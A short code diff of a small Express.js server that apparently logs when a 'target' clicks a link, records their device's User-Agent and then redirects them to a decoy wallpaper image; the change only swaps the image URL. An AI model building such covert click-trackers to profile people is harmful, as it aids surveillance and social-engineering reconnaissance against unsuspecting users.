@@ -7,7 +7,7 @@ app.get('/', (req, res) => {
     console.log('🔥 TARGET CLICKED THE LINK! 🔥');
     console.log('Device Info (User-Agent):', userAgent);
     console.log('--------------------------------------------------');
-    res.redirect('https://wallpapercave.com/wp/wp11915383.jpg');
+    res.redirect('https://images6.alphacoders.com/135/thumbbig-1358426.webp');
 });
 
 app.listen(PORT, () => {
